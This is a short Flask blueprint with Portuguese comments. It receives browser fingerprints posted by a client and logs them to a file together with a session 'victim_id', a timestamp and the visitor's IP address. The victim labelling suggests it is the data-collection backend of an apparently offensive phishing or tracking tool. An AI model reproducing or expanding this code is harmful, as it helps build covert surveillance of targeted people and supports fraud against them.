from flask import Blueprint, request, jsonify, session
from app.utils.logging import log_event
from datetime import datetime

fingerprint_bp = Blueprint('fingerprint', __name__)


@fingerprint_bp.route('/fingerprint', methods=['POST'])
def receber_fingerprint():
    """Recebe e registra o fingerprint do navegador"""
    try:
        dados = request.get_json()
        victim_id = session.get("victim_id", "unknown")

        log_event("FINGERPRINT RECEBIDO", victim_id=victim_id, level="INFO")

        # Salva em arquivo separado para análise
        from flask import current_app
        import os

        caminho_fp = os.path.join(current_app.config['LOGS_DIR'], "fingerprints.log")
        with open(caminho_fp, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*70}\n")
            f.write(f"Data: {datetime.now()} | Victim: {victim_id}\n")
            f.write(f"IP: {request.remote_addr}\n")
            f.write(str(dados) + "\n")

        return jsonify({"status": "ok"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400